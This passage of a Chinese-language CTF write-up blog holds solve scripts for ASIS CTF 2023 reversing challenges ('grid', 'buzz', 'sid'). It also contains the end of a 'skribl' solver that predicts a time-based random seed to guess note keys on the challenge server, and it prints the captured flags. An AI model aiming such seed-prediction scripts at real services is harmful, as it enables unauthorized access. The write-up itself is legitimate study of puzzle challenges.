<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a = re.findall(<span class="string">&quot;duration\((\d+)&quot;</span>,requests.get(<span class="string">&quot;https://skribl.chall.pwnoh.io/&quot;</span>).text)</span><br><span class="line">b = math.floor(time.time())</span><br><span class="line">random.seed(math.floor(<span class="built_in">int</span>(a[<span class="number">0</span>]) - b))</span><br><span class="line">alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line">key_list = [random.choice(alphabet) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join(key_list)</span><br><span class="line">url = <span class="string">&#x27;https://skribl.chall.pwnoh.io/view/&#x27;</span> + key</span><br><span class="line">response = requests.get(url)</span><br><span class="line">lines = response.text.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;bctf&#123;&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#         &lt;p&gt;bctf&#123;wHy_d0_w3_Ne3d_s0_m@ny_N0T3$_aNyW@y&#125;&lt;/p&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>ASIS_CTF2023</title>
    <url>/2023/09/24/ASIS-CTF2023/</url>
    <content><![CDATA[<h6 id="preface赛中做了算三个吧sid有点小变态爆出来了但是没找到flag经别的师傅点醒才知道没有格式反正么只是来看看题而已作业好多还要上学"><a class="markdownIt-Anchor" href="#preface赛中做了算三个吧sid有点小变态爆出来了但是没找到flag经别的师傅点醒才知道没有格式反正么只是来看看题而已作业好多还要上学">#</a> PREFACE：赛中做了算三个吧，sid 有点小变态，爆出来了，但是没找到 flag，经别的师傅点醒才知道没有格式，反正么只是来看看题而已，作业好多还要上学…</h6>
<h6 id="9-25-小补一个题解数毕竟比sid多虽然说题越做越多能做的题确实越来越少了高手题几乎完全没法碰"><a class="markdownIt-Anchor" href="#9-25-小补一个题解数毕竟比sid多虽然说题越做越多能做的题确实越来越少了高手题几乎完全没法碰">#</a> 9-25: 小补一个题，解数毕竟比 sid 多，虽然说题越做越多，能做的题确实越来越少了，高手题几乎完全没法碰…</h6>
<span id="more"></span>
<h3 id="grid"><a class="markdownIt-Anchor" href="#grid">#</a> grid</h3>
<p>warmup 题，加密逻辑很简单，就是对着 box 反映射一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">box = [<span class="number">1</span>, <span class="number">118</span>,   <span class="number">2</span>,  <span class="number">44</span>,   <span class="number">3</span>,  <span class="number">59</span>,   <span class="number">4</span>,  <span class="number">69</span>,   <span class="number">5</span>, <span class="number">189</span>,</span><br><span class="line">    <span class="number">6</span>, <span class="number">242</span>,   <span class="number">7</span>, <span class="number">146</span>,   <span class="number">8</span>,  <span class="number">93</span>,   <span class="number">9</span>, <span class="number">145</span>,  <span class="number">10</span>,  <span class="number">45</span>,</span><br><span class="line">   <span class="number">11</span>,  <span class="number">46</span>,  <span class="number">12</span>, <span class="number">127</span>,  <span class="number">13</span>, <span class="number">233</span>,  <span class="number">14</span>,  <span class="number">60</span>,  <span class="number">15</span>, <span class="number">120</span>,</span><br><span class="line">   <span class="number">16</span>, <span class="number">159</span>,  <span class="number">17</span>, <span class="number">138</span>,  <span class="number">18</span>, <span class="number">165</span>,  <span class="number">19</span>, <span class="number">113</span>,  <span class="number">20</span>, <span class="number">148</span>,</span><br><span class="line">   <span class="number">21</span>,  <span class="number">63</span>,  <span class="number">22</span>, <span class="number">167</span>,  <span class="number">23</span>, <span class="number">219</span>,  <span class="number">24</span>, <span class="number">232</span>,  <span class="number">25</span>, <span class="number">246</span>,</span><br><span class="line">   <span class="number">26</span>, <span class="number">164</span>,  <span class="number">27</span>, <span class="number">153</span>,  <span class="number">28</span>, <span class="number">230</span>,  <span class="number">29</span>,  <span class="number">34</span>,  <span class="number">30</span>,  <span class="number">64</span>,</span><br><span class="line">   <span class="number">31</span>, <span class="number">255</span>,  <span class="number">32</span>, <span class="number">220</span>,  <span class="number">33</span>, <span class="number">238</span>,  <span class="number">34</span>, <span class="number">234</span>,  <span class="number">35</span>,  <span class="number">36</span>,</span><br><span class="line">   <span class="number">36</span>, <span class="number">109</span>,  <span class="number">37</span>,  <span class="number">88</span>,  <span class="number">38</span>,   <span class="number">2</span>,  <span class="number">39</span>, <span class="number">162</span>,  <span class="number">40</span>, <span class="number">221</span>,</span><br><span class="line">   <span class="number">41</span>, <span class="number">134</span>,  <span class="number">42</span>, <span class="number">158</span>,  <span class="number">43</span>, <span class="number">161</span>,  <span class="number">44</span>, <span class="number">225</span>,  <span class="number">45</span>,  <span class="number">25</span>,</span><br><span class="line">   <span class="number">46</span>, <span class="number">224</span>,  <span class="number">47</span>, <span class="number">100</span>,  <span class="number">48</span>, <span class="number">106</span>,  <span class="number">49</span>, <span class="number">179</span>,  <span class="number">50</span>,  <span class="number">94</span>,</span><br><span class="line">   <span class="number">51</span>,  <span class="number">43</span>,  <span class="number">52</span>, <span class="number">187</span>,  <span class="number">53</span>,  <span class="number">56</span>,  <span class="number">54</span>,  <span class="number">79</span>,  <span class="number">55</span>,  <span class="number">48</span>,</span><br><span class="line">   <span class="number">56</span>,  <span class="number">83</span>,  <span class="number">57</span>,  <span class="number">68</span>,  <span class="number">58</span>, <span class="number">117</span>,  <span class="number">59</span>, <span class="number">101</span>,  <span class="number">60</span>, <span class="number">249</span>,</span><br><span class="line">   <span class="number">61</span>,  <span class="number">75</span>,  <span class="number">62</span>, <span class="number">193</span>,  <span class="number">63</span>,  <span class="number">35</span>,  <span class="number">64</span>, <span class="number">178</span>,  <span class="number">65</span>, <span class="number">190</span>,</span><br><span class="line">   <span class="number">66</span>, <span class="number">213</span>,  <span class="number">67</span>,   <span class="number">5</span>,  <span class="number">68</span>, <span class="number">128</span>,  <span class="number">69</span>,  <span class="number">97</span>,  <span class="number">70</span>, <span class="number">254</span>,</span><br><span class="line">   <span class="number">71</span>,  <span class="number">96</span>,  <span class="number">72</span>, <span class="number">227</span>,  <span class="number">73</span>,  <span class="number">50</span>,  <span class="number">74</span>, <span class="number">133</span>,  <span class="number">75</span>, <span class="number">244</span>,</span><br><span class="line">   <span class="number">76</span>, <span class="number">207</span>,  <span class="number">77</span>,  <span class="number">90</span>,  <span class="number">78</span>,  <span class="number">58</span>,  <span class="number">79</span>,  <span class="number">67</span>,  <span class="number">80</span>, <span class="number">214</span>,</span><br><span class="line">   <span class="number">81</span>, <span class="number">111</span>,  <span class="number">82</span>,  <span class="number">84</span>,  <span class="number">83</span>, <span class="number">185</span>,  <span class="number">84</span>, <span class="number">204</span>,  <span class="number">85</span>, <span class="number">245</span>,</span><br><span class="line">   <span class="number">86</span>, <span class="number">181</span>,  <span class="number">87</span>,  <span class="number">89</span>,  <span class="number">88</span>,  <span class="number">22</span>,  <span class="number">89</span>, <span class="number">231</span>,  <span class="number">90</span>, <span class="number">169</span>,</span><br><span class="line">   <span class="number">91</span>, <span class="number">174</span>,  <span class="number">92</span>, <span class="number">241</span>,  <span class="number">93</span>,   <span class="number">8</span>,  <span class="number">94</span>,  <span class="number">62</span>,  <span class="number">95</span>, <span class="number">125</span>,</span><br><span class="line">   <span class="number">96</span>, <span class="number">228</span>,  <span class="number">97</span>, <span class="number">222</span>,  <span class="number">98</span>, <span class="number">198</span>,  <span class="number">99</span>,  <span class="number">28</span>, <span class="number">100</span>, <span class="number">235</span>,</span><br><span class="line">  <span class="number">101</span>, <span class="number">182</span>, <span class="number">102</span>, <span class="number">151</span>, <span class="number">103</span>,  <span class="number">21</span>, <span class="number">104</span>,  <span class="number">81</span>, <span class="number">105</span>, <span class="number">124</span>,</span><br><span class="line">  <span class="number">106</span>, <span class="number">173</span>, <span class="number">107</span>, <span class="number">205</span>, <span class="number">108</span>,  <span class="number">39</span>, <span class="number">109</span>,  <span class="number">10</span>, <span class="number">110</span>,  <span class="number">53</span>,</span><br><span class="line">  <span class="number">111</span>,  <span class="number">95</span>, <span class="number">112</span>, <span class="number">212</span>, <span class="number">113</span>,  <span class="number">19</span>, <span class="number">114</span>, <span class="number">160</span>, <span class="number">115</span>,  <span class="number">20</span>,</span><br><span class="line">  <span class="number">116</span>, <span class="number">103</span>, <span class="number">117</span>, <span class="number">122</span>, <span class="number">118</span>, <span class="number">140</span>, <span class="number">119</span>,  <span class="number">74</span>, <span class="number">120</span>, <span class="number">114</span>,</span><br><span class="line">  <span class="number">121</span>,  <span class="number">47</span>, <span class="number">122</span>, <span class="number">218</span>, <span class="number">123</span>, <span class="number">239</span>, <span class="number">124</span>,  <span class="number">73</span>, <span class="number">125</span>,  <span class="number">14</span>,</span><br><span class="line">  <span class="number">126</span>, <span class="number">211</span>, <span class="number">127</span>, <span class="number">250</span>, <span class="number">128</span>,  <span class="number">61</span>, <span class="number">129</span>, <span class="number">192</span>, <span class="number">130</span>,  <span class="number">51</span>,</span><br><span class="line">  <span class="number">131</span>, <span class="number">102</span>, <span class="number">132</span>, <span class="number">170</span>, <span class="number">133</span>, <span class="number">206</span>, <span class="number">134</span>, <span class="number">252</span>, <span class="number">135</span>, <span class="number">176</span>,</span><br><span class="line">  <span class="number">136</span>,  <span class="number">98</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">138</span>,  <span class="number">65</span>, <span class="number">139</span>, <span class="number">215</span>, <span class="number">140</span>,  <span class="number">72</span>,</span><br><span class="line">  <span class="number">141</span>, <span class="number">191</span>, <span class="number">142</span>, <span class="number">202</span>, <span class="number">143</span>, <span class="number">200</span>, <span class="number">144</span>,   <span class="number">3</span>, <span class="number">145</span>, <span class="number">126</span>,</span><br><span class="line">  <span class="number">146</span>,  <span class="number">15</span>, <span class="number">147</span>, <span class="number">155</span>, <span class="number">148</span>, <span class="number">203</span>, <span class="number">149</span>,  <span class="number">86</span>, <span class="number">150</span>, <span class="number">216</span>,</span><br><span class="line">  <span class="number">151</span>, <span class="number">121</span>, <span class="number">152</span>,  <span class="number">82</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">154</span>, <span class="number">171</span>, <span class="number">155</span>, <span class="number">104</span>,</span><br><span class="line">  <span class="number">156</span>,  <span class="number">66</span>, <span class="number">157</span>, <span class="number">237</span>, <span class="number">158</span>, <span class="number">129</span>, <span class="number">159</span>, <span class="number">132</span>, <span class="number">160</span>, <span class="number">156</span>,</span><br><span class="line">  <span class="number">161</span>,  <span class="number">16</span>, <span class="number">162</span>,  <span class="number">91</span>, <span class="number">163</span>,  <span class="number">11</span>, <span class="number">164</span>,  <span class="number">26</span>, <span class="number">165</span>, <span class="number">112</span>,</span><br><span class="line">  <span class="number">166</span>, <span class="number">248</span>, <span class="number">167</span>,  <span class="number">99</span>, <span class="number">168</span>, <span class="number">166</span>, <span class="number">169</span>, <span class="number">175</span>, <span class="number">170</span>,  <span class="number">32</span>,</span><br><span class="line">  <span class="number">171</span>, <span class="number">152</span>, <span class="number">172</span>,   <span class="number">1</span>, <span class="number">173</span>,  <span class="number">52</span>, <span class="number">174</span>,  <span class="number">41</span>, <span class="number">175</span>, <span class="number">226</span>,</span><br><span class="line">  <span class="number">176</span>, <span class="number">251</span>, <span class="number">177</span>,  <span class="number">23</span>, <span class="number">178</span>, <span class="number">154</span>, <span class="number">179</span>, <span class="number">172</span>, <span class="number">180</span>,   <span class="number">4</span>,</span><br><span class="line">  <span class="number">181</span>,  <span class="number">92</span>, <span class="number">182</span>,  <span class="number">54</span>, <span class="number">183</span>, <span class="number">186</span>, <span class="number">184</span>, <span class="number">217</span>, <span class="number">185</span>, <span class="number">177</span>,</span><br><span class="line">  <span class="number">186</span>, <span class="number">247</span>, <span class="number">187</span>, <span class="number">195</span>, <span class="number">188</span>,  <span class="number">80</span>, <span class="number">189</span>, <span class="number">209</span>, <span class="number">190</span>, <span class="number">188</span>,</span><br><span class="line">  <span class="number">191</span>, <span class="number">229</span>, <span class="number">192</span>, <span class="number">144</span>, <span class="number">193</span>,  <span class="number">37</span>, <span class="number">194</span>,  <span class="number">12</span>, <span class="number">195</span>, <span class="number">136</span>,</span><br><span class="line">  <span class="number">196</span>, <span class="number">184</span>, <span class="number">197</span>,  <span class="number">18</span>, <span class="number">198</span>, <span class="number">210</span>, <span class="number">199</span>,  <span class="number">27</span>, <span class="number">200</span>,  <span class="number">71</span>,</span><br><span class="line">  <span class="number">201</span>,  <span class="number">77</span>, <span class="number">202</span>, <span class="number">196</span>, <span class="number">203</span>,   <span class="number">7</span>, <span class="number">204</span>,  <span class="number">30</span>, <span class="number">205</span>, <span class="number">135</span>,</span><br><span class="line">  <span class="number">206</span>, <span class="number">123</span>, <span class="number">207</span>,  <span class="number">87</span>, <span class="number">208</span>, <span class="number">240</span>, <span class="number">209</span>, <span class="number">253</span>, <span class="number">210</span>,  <span class="number">85</span>,</span><br><span class="line">  <span class="number">211</span>,  <span class="number">29</span>, <span class="number">212</span>, <span class="number">105</span>, <span class="number">213</span>, <span class="number">223</span>, <span class="number">214</span>, <span class="number">108</span>, <span class="number">215</span>,  <span class="number">42</span>,</span><br><span class="line">  <span class="number">216</span>, <span class="number">236</span>, <span class="number">217</span>, <span class="number">110</span>, <span class="number">218</span>, <span class="number">199</span>, <span class="number">219</span>,  <span class="number">40</span>, <span class="number">220</span>, <span class="number">142</span>,</span><br><span class="line">  <span class="number">221</span>, <span class="number">194</span>, <span class="number">222</span>, <span class="number">130</span>, <span class="number">223</span>, <span class="number">157</span>, <span class="number">224</span>,  <span class="number">78</span>, <span class="number">225</span>,  <span class="number">24</span>,</span><br><span class="line">  <span class="number">226</span>, <span class="number">115</span>, <span class="number">227</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">201</span>, <span class="number">229</span>,  <span class="number">13</span>, <span class="number">230</span>, <span class="number">137</span>,</span><br><span class="line">  <span class="number">231</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">107</span>, <span class="number">233</span>, <span class="number">139</span>, <span class="number">234</span>,  <span class="number">70</span>, <span class="number">235</span>,  <span class="number">17</span>,</span><br><span class="line">  <span class="number">236</span>,  <span class="number">33</span>, <span class="number">237</span>, <span class="number">116</span>, <span class="number">238</span>,  <span class="number">76</span>, <span class="number">239</span>,   <span class="number">9</span>, <span class="number">240</span>, <span class="number">243</span>,</span><br><span class="line">  <span class="number">241</span>, <span class="number">197</span>, <span class="number">242</span>, <span class="number">208</span>, <span class="number">243</span>, <span class="number">131</span>, <span class="number">244</span>, <span class="number">183</span>, <span class="number">245</span>,  <span class="number">31</span>,</span><br><span class="line">  <span class="number">246</span>,  <span class="number">55</span>, <span class="number">247</span>, <span class="number">180</span>, <span class="number">248</span>,  <span class="number">38</span>, <span class="number">249</span>,   <span class="number">6</span>, <span class="number">250</span>,  <span class="number">49</span>,</span><br><span class="line">  <span class="number">251</span>, <span class="number">150</span>, <span class="number">252</span>,  <span class="number">57</span>, <span class="number">253</span>, <span class="number">168</span>, <span class="number">254</span>, <span class="number">119</span>, <span class="number">255</span>, <span class="number">143</span>]</span><br><span class="line"><span class="comment"># enc = &#x27;6A35BB7DA9EE7D387CE330EFB932B9BE0D4F50A54DE597DE738DE617D542BE3670EEEEE61443AB627CFBEE31C7DD4F5&#x27;</span></span><br><span class="line">enclist = [<span class="string">&#x27;6A35BB7DA9EE7D387CE330EFB932B9BE&#x27;</span>,<span class="string">&#x27;D4F50A54DE597DE738DE617D542BE367&#x27;</span>,<span class="string">&#x27;0EEEEE61443AB627CFBEE31C7D&#x27;</span>] <span class="comment">#这里需要删掉一点点</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> enc <span class="keyword">in</span> enclist:</span><br><span class="line">    a = [<span class="built_in">int</span>(enc[i:i + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_mapping</span>(<span class="params">lst</span>):</span><br><span class="line">        odd_numbers = []</span><br><span class="line">        even_numbers = []</span><br><span class="line">        mapping = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                even_numbers.append(lst[num])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                odd_numbers.append(lst[num])</span><br><span class="line">        <span class="keyword">for</span> odd, even <span class="keyword">in</span> <span class="built_in">zip</span>(odd_numbers, even_numbers):</span><br><span class="line">            mapping[odd] = even</span><br><span class="line">        <span class="keyword">return</span> mapping</span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span> = create_mapping(box)</span><br><span class="line">    <span class="comment"># print(map)</span></span><br><span class="line">    tmpflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">       tmpflag += <span class="built_in">chr</span>(<span class="built_in">map</span>[i])</span><br><span class="line">    tmpflag = tmpflag[::-<span class="number">1</span>]</span><br><span class="line">    flag += tmpflag</span><br><span class="line">    <span class="built_in">print</span>(tmpflag)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ASIS&#123;7Hi5_!Z_4n0tH3R_Ea5Y_WaRmUp_cHALleN9E!!&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="buzz"><a class="markdownIt-Anchor" href="#buzz">#</a> buzz</h3>
<p>对于 flag 的每一位加密，打印的 BUZZ [] 数量可以转化为数字，即加密后的数</p>
<p>ios 的没设备没环境不能调，否则直接打印一张大映射表就行，只能硬逆，好在逻辑比较简单</p>
<p>但其实不好看，这个逻辑不知道怎么做的编译器优化，很抽象：</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230924085147175.png" alt="image-20230924085147175"></p>
<p>不过可以辨认出 <code>xor</code>   <code>shl</code>   <code>*55</code>   <code>+ 97</code>   <code>+44</code>  等操作，其中 <code>*55</code>  这个会生成一个比较大的数，可以根据这个判断，发现是每七位一组循环加密</p>
<p>先提取 <code>enc[]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_brackets_from_file</span>(<span class="params">filename</span>):</span><br><span class="line">    bracket_count = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            char = f.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> char:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">                bracket_count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> bracket_count &gt; <span class="number">0</span>:</span><br><span class="line">                    result.append(bracket_count)</span><br><span class="line">                    bracket_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> bracket_count &gt; <span class="number">0</span>:</span><br><span class="line">        result.append(bracket_count)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./flag.enc&quot;</span></span><br><span class="line">result = read_brackets_from_file(filename)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以发现后续都是填充用的，不需要管</span></span><br></pre></td></tr></table></figure>
<p>介于加密逻辑不能调确实静态看挺麻烦的，<a href="http://xn--exp-7j2eu7ei2uosl6kqs6da194na.py">反正就猜猜测测拿到 exp.py</a>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">34</span>, <span class="number">99</span>, <span class="number">1168</span>, <span class="number">332</span>, <span class="number">6765</span>, <span class="number">197</span>, <span class="number">117</span>, <span class="number">5</span>, <span class="number">118</span>, <span class="number">784</span>, <span class="number">396</span>, <span class="number">6435</span>, <span class="number">205</span>, <span class="number">128</span>, <span class="number">60</span>, <span class="number">68</span>, <span class="number">832</span>, <span class="number">460</span>, <span class="number">5885</span>, <span class="number">192</span>, <span class="number">92</span>, <span class="number">5</span>, <span class="number">111</span>, <span class="number">1872</span>, <span class="number">312</span>, <span class="number">5500</span>, <span class="number">148</span>, <span class="number">158</span>, <span class="number">48</span>, <span class="number">68</span>, <span class="number">1040</span>, <span class="number">440</span>, <span class="number">5500</span>, <span class="number">130</span>, <span class="number">154</span>, <span class="number">90</span>, <span class="number">111</span>, <span class="number">1856</span>, <span class="number">288</span>, <span class="number">2805</span>, <span class="number">192</span>, <span class="number">117</span>, <span class="number">13</span>, <span class="number">126</span>, <span class="number">1616</span>, <span class="number">456</span>, <span class="number">5225</span>, <span class="number">216</span>, <span class="number">123</span>, <span class="number">17</span>, <span class="number">123</span>, <span class="number">1680</span>, <span class="number">440</span>, <span class="number">3905</span>, <span class="number">150</span>, <span class="number">139</span>, <span class="number">12</span>, <span class="number">118</span>, <span class="number">1520</span>, <span class="number">392</span>, <span class="number">2695</span>, <span class="number">207</span>, <span class="number">141</span>, <span class="number">49</span>, <span class="number">73</span>, <span class="number">528</span>, <span class="number">500</span>, <span class="number">550</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(enc))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">7</span> == <span class="number">1</span>):</span><br><span class="line">        enc[i] ^= <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) ^ <span class="number">34</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">7</span> == <span class="number">2</span>):</span><br><span class="line">        enc[i] ^= <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">7</span> == <span class="number">3</span>):</span><br><span class="line">        enc[i] //= <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">7</span> == <span class="number">4</span>):</span><br><span class="line">        enc[i] //= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">7</span> == <span class="number">5</span>):</span><br><span class="line">        enc[i] //= <span class="number">55</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">7</span> == <span class="number">6</span>):</span><br><span class="line">        enc[i] -= <span class="number">97</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">7</span> == <span class="number">0</span>):</span><br><span class="line">        enc[i] -= <span class="number">44</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ASIS&#123;dIfF1culT_t4sk_0f_uNd3rStAnd!n9_tH3_InNer_wOrKinG5_oF_b1naRy!&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="sid"><a class="markdownIt-Anchor" href="#sid">#</a> sid</h3>
<p>cpp 玩意跟混淆了一样… 真的难顶</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230924085847189.png" alt="image-20230924085847189"></p>
<p>不过其实也就用了点 <code>stl string</code>  多做点可以猜猜</p>
<p>坏了，现在复盘的时候发现了，前面已经截掉 <code>ASIS&#123;</code> 了，昨天爆破的头晕眼花了把这事给忘了…</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230924085932475.png" alt="image-20230924085932475"></p>
<p>有些大数操作看起来是编译器优化的产物，动调过去就知道没啥用了</p>
<p>主要加密逻辑（已经手动写了符号）：</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230924090138635.png" alt="image-20230924090138635"></p>
<p>其中比较难逆的就是 <code>string_append_and_some_kind_of_enc</code>  这个玩意（低水平起名）</p>
<p>里面都是很看不懂的大数操作和 string 操作</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230924090248263.png" alt="image-20230924090248263"></p>
<p>不过进来就可以看到特征数了</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230924090324244.png" alt="image-20230924090324244"></p>
<p>注意这里还做了魔改，这个 some_enc 看起来就是流加密 <code>chacha20</code>  或者 <code>salsa20</code>  的流密钥初始化，但是他下面还加了异或随机数</p>
<p><img loading="lazy" data-src="ASIS-CTF2023/image-20230924090624372.png" alt="image-20230924090624372"></p>
<p>分别写 chacha20 脚本和 salsa 脚本测试一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="comment"># chacha20</span></span><br><span class="line">key = <span class="string">b&#x27;\x07\x05\x0B\x0D\x0F\x0D\x0B\x05\x07\x05\x1B\x1D\x1F\x1D\x1B\x05\x07\x05\x0B\x0D\x0F\x37\x35\x3B\x3D\x3F\x07\x05\x0B\x0D\x0F\x0D&#x27;</span></span><br><span class="line">plaintext = <span class="string">b&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&quot;</span></span><br><span class="line">nonce = <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">cipher = ChaCha20.new(key=key,nonce=nonce)</span><br><span class="line">ciphertext = cipher.encrypt(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 nonce（用于解密）</span></span><br><span class="line"><span class="comment"># nonce = cipher.nonce</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="comment"># cipher = ChaCha20.new(key=key, nonce=nonce)</span></span><br><span class="line"><span class="comment"># decrypted_text = cipher.decrypt(ciphertext)</span></span><br><span class="line"></span><br><span class="line">a = [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ciphertext]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = [    <span class="number">0x20</span>, <span class="number">0xFD</span>, <span class="number">0x17</span>, <span class="number">0xA2</span>, <span class="number">0x34</span>, <span class="number">0x4E</span>, <span class="number">0x3C</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0x53</span>, <span class="number">0x27</span>, <span class="number">0x13</span>, <span class="number">0x73</span>, <span class="number">0x9E</span>, <span class="number">0xFA</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x1D</span>,</span><br><span class="line">  <span class="number">0x49</span>, <span class="number">0xDB</span>, <span class="number">0x27</span>, <span class="number">0x5D</span>, <span class="number">0xEC</span>, <span class="number">0x63</span>, <span class="number">0xD4</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x4C</span>,</span><br><span class="line">  <span class="number">0x7E</span>, <span class="number">0x83</span>, <span class="number">0xC5</span>, <span class="number">0x63</span>, <span class="number">0xA3</span>, <span class="number">0xD9</span>, <span class="number">0x47</span>, <span class="number">0x6B</span>, <span class="number">0xFB</span>, <span class="number">0x65</span>,</span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0x6B</span>, <span class="number">0xF5</span>, <span class="number">0x5F</span>, <span class="number">0x9C</span>, <span class="number">0xCF</span>, <span class="number">0x49</span>, <span class="number">0x17</span>, <span class="number">0x6C</span>, <span class="number">0xE8</span>,</span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0xEF</span>, <span class="number">0xC3</span>, <span class="number">0xED</span>, <span class="number">0x95</span>, <span class="number">0x75</span>, <span class="number">0xAF</span>, <span class="number">0x70</span>, <span class="number">0x4D</span>, <span class="number">0x70</span>,</span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0xD1</span>, <span class="number">0x36</span>, <span class="number">0x00</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(a[i],<span class="number">16</span>) ^ b[i]),end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>
